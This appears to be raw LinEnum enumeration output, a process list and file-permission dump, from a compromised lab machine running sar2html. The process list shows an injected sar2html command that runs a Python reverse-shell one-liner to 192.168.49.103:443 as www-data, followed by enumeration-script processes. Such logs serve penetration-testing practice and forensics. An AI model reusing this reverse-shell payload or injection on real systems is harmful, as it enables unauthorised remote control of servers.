root        28  0.0  0.0      0     0 ?        I<   11:29   0:00 [tpm_dev_wq]
root        29  0.0  0.0      0     0 ?        I<   11:29   0:00 [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   11:29   0:00 [md]
root        31  0.0  0.0      0     0 ?        I<   11:29   0:00 [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   11:29   0:00 [devfreq_wq]
root        33  0.0  0.0      0     0 ?        S    11:29   0:00 [watchdogd]
root        37  0.0  0.0      0     0 ?        S    11:29   0:01 [kswapd0]
root        38  0.0  0.0      0     0 ?        I<   11:29   0:00 [kworker/u3:0]
root        39  0.0  0.0      0     0 ?        S    11:29   0:00 [ecryptfs-kthrea]
root       128  0.0  0.0      0     0 ?        I<   11:29   0:00 [kthrotld]
root       129  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/24-pciehp]
root       130  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/25-pciehp]
root       131  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/26-pciehp]
root       132  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/27-pciehp]
root       133  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/28-pciehp]
root       134  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/29-pciehp]
root       135  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/30-pciehp]
root       136  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/31-pciehp]
root       137  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/32-pciehp]
root       138  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/33-pciehp]
root       139  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/34-pciehp]
root       140  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/35-pciehp]
root       141  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/36-pciehp]
root       142  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/37-pciehp]
root       143  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/38-pciehp]
root       144  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/39-pciehp]
root       145  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/40-pciehp]
root       146  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/41-pciehp]
root       147  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/42-pciehp]
root       148  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/43-pciehp]
root       149  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/44-pciehp]
root       150  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/45-pciehp]
root       151  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/46-pciehp]
root       152  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/47-pciehp]
root       153  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/48-pciehp]
root       154  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/49-pciehp]
root       155  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/50-pciehp]
root       156  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/51-pciehp]
root       157  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/52-pciehp]
root       158  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/53-pciehp]
root       159  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/54-pciehp]
root       160  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/55-pciehp]
root       161  0.0  0.0      0     0 ?        I<   11:29   0:00 [acpi_thermal_pm]
root       162  0.0  0.0      0     0 ?        S    11:29   0:00 [scsi_eh_0]
root       163  0.0  0.0      0     0 ?        I<   11:29   0:00 [scsi_tmf_0]
root       164  0.0  0.0      0     0 ?        S    11:29   0:00 [scsi_eh_1]
root       165  0.0  0.0      0     0 ?        I<   11:29   0:00 [scsi_tmf_1]
root       168  0.0  0.0      0     0 ?        I<   11:29   0:00 [ipv6_addrconf]
root       169  0.0  0.0      0     0 ?        I    11:29   0:00 [kworker/0:2-eve]
root       180  0.0  0.0      0     0 ?        I<   11:29   0:00 [kstrp]
root       199  0.0  0.0      0     0 ?        I<   11:29   0:00 [charger_manager]
root       201  0.0  0.0      0     0 ?        I<   11:29   0:00 [kworker/0:1H-kb]
root       254  0.0  0.0      0     0 ?        I<   11:29   0:00 [mpt_poll_0]
root       255  0.0  0.0      0     0 ?        I<   11:29   0:00 [mpt/0]
root       257  0.0  0.0      0     0 ?        S    11:29   0:00 [scsi_eh_2]
root       258  0.0  0.0      0     0 ?        I<   11:29   0:00 [scsi_tmf_2]
root       259  0.0  0.0      0     0 ?        I<   11:29   0:00 [mpt_poll_1]
root       260  0.0  0.0      0     0 ?        I<   11:29   0:00 [mpt/1]
root       261  0.0  0.0      0     0 ?        S    11:29   0:00 [scsi_eh_3]
root       262  0.0  0.0      0     0 ?        I<   11:29   0:00 [scsi_tmf_3]
root       283  0.0  0.0      0     0 ?        S    11:29   0:00 [jbd2/sda1-8]
root       284  0.0  0.0      0     0 ?        I<   11:29   0:00 [ext4-rsv-conver]
root       316  0.0  0.9  95048  9832 ?        S<s  11:29   0:00 /lib/systemd/systemd-journald
root       340  0.0  0.3  46708  3020 ?        Ss   11:29   0:00 /lib/systemd/systemd-udevd
root       366  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop0]
root       371  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop1]
root       375  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop2]
root       377  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop3]
root       380  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop4]
root       382  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop5]
root       391  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop6]
root       392  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop7]
root       393  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop8]
root       407  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop9]
root       415  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop10]
root       428  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop11]
root       434  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop12]
root       439  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop13]
root       440  0.0  0.0      0     0 ?        S<   11:29   0:00 [loop14]
systemd+   473  0.0  0.2  70752  2224 ?        Ss   11:29   0:00 /lib/systemd/systemd-resolved
root       506  0.0  0.0      0     0 ?        S    11:29   0:00 [irq/16-vmwgfx]
root       508  0.0  0.0      0     0 ?        I<   11:29   0:00 [ttm_swap]
root       662  0.0  0.6  98276  6972 ?        Ss   11:29   0:00 /usr/bin/VGAuthService
root       663  0.0  0.7 244224  7196 ?        Ssl  11:29   0:01 /usr/bin/vmtoolsd
root       672  0.0  0.6 434320  6076 ?        Ssl  11:29   0:00 /usr/sbin/ModemManager --filter-policy=strict
root       674  0.0  0.8 308532  8168 ?        Ssl  11:29   0:00 /usr/lib/accountsservice/accounts-daemon
root       681  0.0  0.2  38424  2884 ?        Ss   11:29   0:00 /usr/sbin/cron -f
root       688  0.0  0.9 517544  9468 ?        Ssl  11:29   0:00 /usr/lib/udisks2/udisksd
root       689  0.0  0.4  70704  4356 ?        Ss   11:29   0:00 /lib/systemd/systemd-logind
message+   690  0.0  0.5  51324  5076 ?        Ss   11:29   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       757  0.0  1.5 646056 15396 ?        Ssl  11:29   0:00 /usr/lib/snapd/snapd
root       774  0.0  0.0   4548   688 ?        Ss   11:29   0:00 /usr/sbin/acpid
root       783  0.0  1.6 508760 16176 ?        Ssl  11:29   0:00 /usr/sbin/NetworkManager --no-daemon
syslog     789  0.0  0.3 269328  3220 ?        Ssl  11:29   0:00 /usr/sbin/rsyslogd -n
avahi      793  0.0  0.2  47256  2924 ?        Ss   11:29   0:00 avahi-daemon: running [sar.local]
avahi      803  0.0  0.0  47072    44 ?        S    11:29   0:00 avahi-daemon: chroot helper
root       807  0.0  1.3 177680 13432 ?        Ssl  11:29   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       809  0.0  0.3  45220  3584 ?        Ss   11:29   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       859  0.0  1.0 311312 10376 ?        Ssl  11:29   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       893  0.0  1.9 194384 19340 ?        Ssl  11:29   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       913  0.0  0.5  72292  5580 ?        Ss   11:29   0:00 /usr/sbin/sshd -D
root       982  0.0  4.8 538312 48368 ?        Ss   11:29   0:00 /usr/sbin/apache2 -k start
root      1180  0.0  0.1 134220  1536 ?        S    11:29   0:00 VBoxClient --vmsvga
root      1205  0.0  0.7 308052  7868 ?        Ssl  11:29   0:00 /usr/sbin/gdm3
root      1210  0.0  0.8 261552  8292 ?        Sl   11:29   0:00 gdm-session-worker [pam/gdm-launch-environment]
gdm       1219  0.0  0.6  76864  6436 ?        Ss   11:29   0:00 /lib/systemd/systemd --user
gdm       1220  0.0  0.1 196032  1660 ?        S    11:29   0:00 (sd-pam)
gdm       1231  0.0  0.5 212128  5908 tty1     Ssl+ 11:29   0:00 /usr/lib/gdm3/gdm-x-session gnome-session --autostart /usr/share/gdm/greeter/autostart
gdm       1233  0.0  4.2 308244 42844 tty1     Sl+  11:29   0:00 /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/121/gdm/Xauthority -background none -noreset -keeptty -verbose 3
gdm       1238  0.0  0.4  50220  4572 ?        Ss   11:29   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
gdm       1242  0.0  1.4 566908 14776 tty1     Sl+  11:29   0:00 /usr/lib/gnome-session/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
gdm       1244  0.0  0.8 367828  8716 ?        Ssl  11:29   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
gdm       1247  0.0  0.6 291952  6700 ?        Ssl  11:29   0:00 /usr/lib/gvfs/gvfsd
gdm       1252  0.0  0.7 366484  7832 ?        Sl   11:29   0:00 /usr/lib/gvfs/gvfsd-fuse /run/user/121/gvfs -f -o big_writes
gdm       1255  0.0  0.4  49920  4024 ?        S    11:29   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
gdm       1260  0.0  0.6 220776  6732 ?        Sl   11:29   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
gdm       1275  0.1 19.6 2910908 197228 tty1   Sl+  11:29   0:03 /usr/bin/gnome-shell
root      1281  0.0  0.8 322300  8476 ?        Ssl  11:29   0:00 /usr/lib/upower/upowerd
gdm       1293  0.0  0.7 1072540 7584 ?        Ssl  11:29   0:00 /usr/bin/pulseaudio --daemonize=no
rtkit     1295  0.0  0.2 183500  2980 ?        SNsl 11:29   0:00 /usr/lib/rtkit/rtkit-daemon
gdm       1305  0.0  0.9 448952  9464 tty1     Sl   11:29   0:00 ibus-daemon --xim --panel disable
gdm       1308  0.0  0.7 294488  7764 tty1     Sl   11:29   0:00 /usr/lib/ibus/ibus-dconf
gdm       1311  0.0  2.1 354216 22040 tty1     Sl   11:29   0:00 /usr/lib/ibus/ibus-x11 --kill-daemon
gdm       1313  0.0  0.7 292432  7520 ?        Sl   11:29   0:00 /usr/lib/ibus/ibus-portal
gdm       1324  0.0  0.5 271560  5088 ?        Ssl  11:29   0:00 /usr/libexec/xdg-permission-store
root      1335  0.0  0.8 315224  8912 ?        Ssl  11:29   0:00 /usr/lib/x86_64-linux-gnu/boltd
root      1339  0.0  1.3 382424 13736 ?        Ssl  11:29   0:00 /usr/lib/packagekit/packagekitd
gdm       1340  0.0  2.3 502580 23220 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-xsettings
gdm       1343  0.0  0.7 294444  7788 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-a11y-settings
gdm       1346  0.0  2.1 353824 21352 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-clipboard
gdm       1349  0.0  2.2 666836 23048 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-color
gdm       1350  0.0  1.3 393708 13640 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-datetime
gdm       1352  0.0  0.5 283736  5484 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-housekeeping
gdm       1354  0.0  2.2 514596 22604 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-keyboard
gdm       1358  0.0  2.4 874756 24592 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-media-keys
gdm       1362  0.0  0.4 201996  4568 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-mouse
gdm       1363  0.0  2.3 525364 23332 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-power
gdm       1365  0.0  0.8 267004  8644 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-print-notifications
gdm       1368  0.0  0.4 202016  4608 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-rfkill
gdm       1370  0.0  0.4 275732  4640 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-screensaver-proxy
gdm       1374  0.0  0.9 321388  9368 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-sharing
gdm       1380  0.0  0.9 464312  9112 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-smartcard
gdm       1383  0.0  0.9 340888  9248 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-sound
gdm       1389  0.0  2.2 438696 22720 tty1     Sl+  11:29   0:00 /usr/lib/gnome-settings-daemon/gsd-wacom
colord    1409  0.0  1.5 339548 15668 ?        Ssl  11:29   0:00 /usr/lib/colord/colord
gdm       1437  0.0  0.7 218632  7520 tty1     Sl   11:29   0:00 /usr/lib/ibus/ibus-engine-simple
whoopsie  1451  0.0  1.3 468728 13168 ?        Ssl  11:30   0:00 /usr/bin/whoopsie -f
kernoops  1460  0.0  0.0  56936   416 ?        Ss   11:30   0:00 /usr/sbin/kerneloops --test
kernoops  1463  0.0  0.0  56936   420 ?        Ss   11:30   0:00 /usr/sbin/kerneloops
gdm       1497  0.0  0.5 187772  5068 ?        Sl   11:30   0:00 /usr/lib/dconf/dconf-service
root      2070  0.0  0.8 107680  8236 ?        Ss   11:34   0:00 /usr/sbin/cupsd -l
root      2075  0.0  1.0 303520 11032 ?        Ssl  11:34   0:00 /usr/sbin/cups-browsed
www-data  2344  0.0  2.4 541276 24436 ?        S    11:39   0:00 /usr/sbin/apache2 -k start
www-data  2345  0.0  1.7 540652 17896 ?        S    11:39   0:00 /usr/sbin/apache2 -k start
www-data  2346  0.0  2.2 540856 22524 ?        S    11:39   0:00 /usr/sbin/apache2 -k start
www-data  2347  0.0  1.7 540636 17896 ?        S    11:39   0:00 /usr/sbin/apache2 -k start
www-data  2348  0.0  1.7 540652 17896 ?        S    11:39   0:00 /usr/sbin/apache2 -k start
www-data  2434  0.0  1.7 540636 17896 ?        S    11:43   0:00 /usr/sbin/apache2 -k start
www-data  2436  0.0  0.0   4624   784 ?        S    11:43   0:00 sh -c ./sar2html -r ;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.103",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
www-data  2440  0.0  1.0  36460 10508 ?        S    11:43   0:00 python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.103",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
www-data  2441  0.0  0.1   4624  1784 ?        S    11:43   0:00 /bin/sh -i
root      2591  0.0  0.0      0     0 ?        I    11:51   0:00 [kworker/u2:2-ev]
root      2884  0.0  0.0      0     0 ?        I    12:05   0:00 [kworker/u2:1-ev]
root      3067  0.0  0.0      0     0 ?        I    12:13   0:00 [kworker/u2:0]
root      3068  0.0  0.0   4624   780 ?        Ss   12:13   0:00 /bin/sh /usr/lib/apt/apt.systemd.daily install
root      3072  0.0  0.1   4624  1716 ?        S    12:13   0:00 /bin/sh /usr/lib/apt/apt.systemd.daily lock_is_held install
root      3099  100 11.7 229888 118620 ?       RN   12:13   1:01 /usr/bin/python3 /usr/bin/unattended-upgrade
www-data  3121  0.0  0.3  19288  3968 ?        S    12:14   0:00 /bin/bash ./linenum.sh
www-data  3122  0.0  0.3  19288  3056 ?        S    12:14   0:00 /bin/bash ./linenum.sh
www-data  3123  0.0  0.0   4532   764 ?        S    12:14   0:00 tee -a
www-data  3342  0.0  0.2  19288  2868 ?        S    12:14   0:00 /bin/bash ./linenum.sh
www-data  3343  0.0  0.2  34396  2940 ?        R    12:14   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  1113504 Jun  7  2019 /bin/bash
lrwxrwxrwx 1 root root        4 Oct 20  2019 /bin/sh -> dash
-rwxr-xr-x 1 root root  1595792 Jun 24  2019 /lib/systemd/systemd
-rwxr-xr-x 1 root root   129096 Jun 24  2019 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   219272 Jun 24  2019 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   378944 Jun 24  2019 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root   584136 Jun 24  2019 /lib/systemd/systemd-udevd
lrwxrwxrwx 1 root root       20 Oct 20  2019 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root  2261008 May  1  2019 /sbin/wpa_supplicant
-rwxr-xr-x 1 root root   129248 Dec  9  2019 /usr/bin/VGAuthService
-rwxr-xr-x 1 root root   236584 Jun 10  2019 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    18760 May 10  2019 /usr/bin/gnome-shell
-rwxr-xr-x 1 root root    92328 Jan 23  2019 /usr/bin/pulseaudio
lrwxrwxrwx 1 root root        9 Oct 20  2019 /usr/bin/python3 -> python3.6
-rwxr-xr-x 1 root root    55552 Dec  9  2019 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root    56056 Jul  5  2019 /usr/bin/whoopsie
-rwxr-xr-x 1 root root   182552 Dec 18  2017 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    22600 Mar 13  2018 /usr/lib/at-spi2-core/at-spi-bus-launcher
-rwxr-xr-x 1 root root    91720 Mar 13  2018 /usr/lib/at-spi2-core/at-spi2-registryd
-rwxr-xr-x 1 root root   309520 Jul 23  2017 /usr/lib/colord/colord
-rwxr-xr-x 1 root root    79944 Mar 29  2018 /usr/lib/dconf/dconf-service
-rwxr-xr-x 1 root root    80192 Feb 19  2019 /usr/lib/gdm3/gdm-x-session
-rwxr-xr-x 1 root root   297504 May  2  2018 /usr/lib/gnome-session/gnome-session-binary
-rwxr-xr-x 1 root root    18712 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-a11y-settings
-rwxr-xr-x 1 root root    26904 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-clipboard
-rwxr-xr-x 1 root root    80216 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-color
-rwxr-xr-x 1 root root    68216 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-datetime
-rwxr-xr-x 1 root root    43736 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-housekeeping
-rwxr-xr-x 1 root root    35416 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-keyboard
-rwxr-xr-x 1 root root   219480 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-media-keys
-rwxr-xr-x 1 root root    22808 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-mouse
-rwxr-xr-x 1 root root    92488 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-power
-rwxr-xr-x 1 root root    43320 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-print-notifications
-rwxr-xr-x 1 root root    39192 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-rfkill
-rwxr-xr-x 1 root root    22808 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-screensaver-proxy
-rwxr-xr-x 1 root root    31000 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-sharing
-rwxr-xr-x 1 root root    96536 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-smartcard
-rwxr-xr-x 1 root root    22808 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-sound
-rwxr-xr-x 1 root root    59720 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-wacom
-rwxr-xr-x 1 root root    64952 Jun 21  2019 /usr/lib/gnome-settings-daemon/gsd-xsettings
-rwxr-xr-x 1 root root    34808 Jul  5  2019 /usr/lib/gvfs/gvfsd
-rwxr-xr-x 1 root root    43376 Jul  5  2019 /usr/lib/gvfs/gvfsd-fuse
-rwxr-xr-x 1 root root    18504 Apr 17  2018 /usr/lib/ibus/ibus-dconf
-rwxr-xr-x 1 root root    14408 Apr 17  2018 /usr/lib/ibus/ibus-engine-simple
-rwxr-xr-x 1 root root    84040 Apr 17  2018 /usr/lib/ibus/ibus-portal
-rwxr-xr-x 1 root root    95944 Apr 17  2018 /usr/lib/ibus/ibus-x11
-rwxr-xr-x 1 root root   280784 Mar  4  2019 /usr/lib/packagekit/packagekitd
-rwxr-xr-x 1 root root    14552 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root    63848 Feb 16  2018 /usr/lib/rtkit/rtkit-daemon
-rwxr-xr-x 1 root root 17572456 Jun  5  2019 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root   441840 Sep 26  2018 /usr/lib/udisks2/udisksd
-rwxr-xr-x 1 root root   247880 Jan 25  2019 /usr/lib/upower/upowerd
-rwxr-xr-x 1 root root   194888 Oct 31  2018 /usr/lib/x86_64-linux-gnu/boltd
-rwxr-xr-x 1 root root  2424184 May  2  2019 /usr/lib/xorg/Xorg
-rwxr-xr-x 1 root root    96536 Mar 22  2019 /usr/libexec/xdg-permission-store
-rwxr-xr-x 1 root root  1436736 May  6  2019 /usr/sbin/ModemManager
-rwxr-xr-x 1 root root  2651328 Nov  3  2018 /usr/sbin/NetworkManager
-rwxr-xr-x 1 root root    52064 Apr 28  2017 /usr/sbin/acpid
-rwxr-xr-x 1 root root   671392 Sep 16  2019 /usr/sbin/apache2
-rwxr-xr-x 1 root root    47416 Nov 16  2017 /usr/sbin/cron
-rwxr-xr-x 1 root root   178592 May  9  2019 /usr/sbin/cups-browsed
-rwxr-xr-x 1 root root   432712 May 30  2019 /usr/sbin/cupsd
-rwxr-xr-x 1 root root   420224 Feb 19  2019 /usr/sbin/gdm3
-rwxr-xr-x 1 root root    26616 Dec  2  2017 /usr/sbin/kerneloops
-rwxr-xr-x 1 root root   680488 Apr 24  2018 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   786856 Mar  4  2019 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 212
drwxr-xr-x   2 root root  4096 Jul 14  2020 .
drwxr-xr-x 125 root root 12288 Jul 14  2020 ..
-rwxr-xr-x   1 root root  2269 Apr 22  2017 acpid
-rwxr-xr-x   1 root root  5336 Jan 23  2017 alsa-utils
-rwxr-xr-x   1 root root  2014 May 29  2017 anacron
-rwxr-xr-x   1 root root  2489 Jul 16  2019 apache-htcacheclean
-rwxr-xr-x   1 root root  8181 Jul 16  2019 apache2
-rwxr-xr-x   1 root root  4335 Mar 23  2018 apparmor
-rwxr-xr-x   1 root root  2802 Nov 20  2017 apport
-rwxr-xr-x   1 root root  2401 Aug 22  2018 avahi-daemon
-rwxr-xr-x   1 root root  2968 Feb  5  2018 bluetooth
-rwxr-xr-x   1 root root  1232 Apr 19  2018 console-setup.sh
-rwxr-xr-x   1 root root  3049 Nov 16  2017 cron
-rwxr-xr-x   1 root root  2804 Mar 27  2018 cups
-rwxr-xr-x   1 root root  1961 Feb 26  2018 cups-browsed
-rwxr-xr-x   1 root root  2813 Nov 16  2017 dbus
-rwxr-xr-x   1 root root  1172 Jun  6  2016 dns-clean
-rwxr-xr-x   1 root root  3033 Oct  9  2018 gdm3
-rwxr-xr-x   1 root root   985 Mar 18  2019 grub-common
-rwxr-xr-x   1 root root  3809 Feb 15  2018 hwclock.sh
-rwxr-xr-x   1 root root  2444 Oct 25  2017 irqbalance
-rwxr-xr-x   1 root root  3131 May 19  2017 kerneloops
-rwxr-xr-x   1 root root  1479 Feb 16  2018 keyboard-setup.sh
-rwxr-xr-x   1 root root  2044 Aug 16  2017 kmod
-rwxr-xr-x   1 root root  5930 Aug  2  2019 mysql
-rwxr-xr-x   1 root root  1942 Mar 26  2018 network-manager
-rwxr-xr-x   1 root root  4597 Nov 25  2016 networking
-rwxr-xr-x   1 root root  1846 Dec  9  2019 open-vm-tools
-rwxr-xr-x   1 root root  1366 Apr  4  2019 plymouth
-rwxr-xr-x   1 root root   752 Apr  4  2019 plymouth-log
-rwxr-xr-x   1 root root   612 Feb 26  2018 pppd-dns
-rwxr-xr-x   1 root root  1191 Jan 18  2018 procps
-rwxr-xr-x   1 root root  4355 Dec 13  2017 rsync
-rwxr-xr-x   1 root root  2864 Jan 14  2018 rsyslog
-rwxr-xr-x   1 root root  2333 Aug 10  2017 saned
-rwxr-xr-x   1 root root  2117 Dec 15  2017 speech-dispatcher
-rwxr-xr-x   1 root root  2484 Jan 20  2017 spice-vdagent
-rwxr-xr-x   1 root root  3837 Jan 26  2018 ssh
-rwxr-xr-x   1 root root  5974 Apr 20  2018 udev
-rwxr-xr-x   1 root root  2083 Aug 15  2017 ufw
-rwxr-xr-x   1 root root  1391 Apr 29  2019 unattended-upgrades
-rwxr-xr-x   1 root root  1306 Oct 16  2018 uuidd
-rwxr-xr-x   1 root root   485 Apr  3  2015 whoopsie
-rwxr-xr-x   1 root root  2757 Jan 20  2017 x11-common


[-] /etc/init/ config file permissions:
total 24
drwxr-xr-x   2 root root  4096 Oct 20  2019 .
drwxr-xr-x 125 root root 12288 Jul 14  2020 ..
-rw-r--r--   1 root root   278 May 29  2017 anacron.conf
-rw-r--r--   1 root root   453 Jul  5  2019 whoopsie.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 7.3M
drwxr-xr-x 26 root root  20K Jul 14  2020 system
drwxr-xr-x  2 root root 4.0K Oct 20  2019 system-generators
drwxr-xr-x  2 root root 4.0K Aug  6  2019 system-sleep
drwxr-xr-x  2 root root 4.0K Aug  6  2019 network
drwxr-xr-x  2 root root 4.0K Aug  6  2019 system-preset
-rw-r--r--  1 root root 2.3M Jun 24  2019 libsystemd-shared-237.so
-rw-r--r--  1 root root  699 Jun 24  2019 resolv.conf
-rwxr-xr-x  1 root root 1.3K Jun 24  2019 set-cpufreq
-rwxr-xr-x  1 root root 1.6M Jun 24  2019 systemd
-rwxr-xr-x  1 root root 6.0K Jun 24  2019 systemd-ac-power
-rwxr-xr-x  1 root root  18K Jun 24  2019 systemd-backlight
-rwxr-xr-x  1 root root  11K Jun 24  2019 systemd-binfmt
-rwxr-xr-x  1 root root  10K Jun 24  2019 systemd-cgroups-agent
-rwxr-xr-x  1 root root  22K Jun 24  2019 systemd-cryptsetup
-rwxr-xr-x  1 root root  15K Jun 24  2019 systemd-dissect
-rwxr-xr-x  1 root root  18K Jun 24  2019 systemd-fsck
-rwxr-xr-x  1 root root  23K Jun 24  2019 systemd-fsckd
-rwxr-xr-x  1 root root  19K Jun 24  2019 systemd-growfs
-rwxr-xr-x  1 root root  10K Jun 24  2019 systemd-hibernate-resume
-rwxr-xr-x  1 root root  23K Jun 24  2019 systemd-hostnamed
-rwxr-xr-x  1 root root  15K Jun 24  2019 systemd-initctl
-rwxr-xr-x  1 root root 127K Jun 24  2019 systemd-journald
-rwxr-xr-x  1 root root  35K Jun 24  2019 systemd-localed
-rwxr-xr-x  1 root root 215K Jun 24  2019 systemd-logind
-rwxr-xr-x  1 root root  10K Jun 24  2019 systemd-makefs
-rwxr-xr-x  1 root root  15K Jun 24  2019 systemd-modules-load
-rwxr-xr-x  1 root root 1.6M Jun 24  2019 systemd-networkd
-rwxr-xr-x  1 root root  19K Jun 24  2019 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  11K Jun 24  2019 systemd-quotacheck
-rwxr-xr-x  1 root root  10K Jun 24  2019 systemd-random-seed
-rwxr-xr-x  1 root root  15K Jun 24  2019 systemd-remount-fs
-rwxr-xr-x  1 root root  10K Jun 24  2019 systemd-reply-password
-rwxr-xr-x  1 root root 371K Jun 24  2019 systemd-resolved
-rwxr-xr-x  1 root root  19K Jun 24  2019 systemd-rfkill
-rwxr-xr-x  1 root root  43K Jun 24  2019 systemd-shutdown
-rwxr-xr-x  1 root root  19K Jun 24  2019 systemd-sleep
-rwxr-xr-x  1 root root  23K Jun 24  2019 systemd-socket-proxyd
-rwxr-xr-x  1 root root  11K Jun 24  2019 systemd-sulogin-shell
-rwxr-xr-x  1 root root  15K Jun 24  2019 systemd-sysctl
-rwxr-xr-x  1 root root 1.3K Jun 24  2019 systemd-sysv-install
-rwxr-xr-x  1 root root  27K Jun 24  2019 systemd-timedated
-rwxr-xr-x  1 root root  39K Jun 24  2019 systemd-timesyncd
-rwxr-xr-x  1 root root 571K Jun 24  2019 systemd-udevd
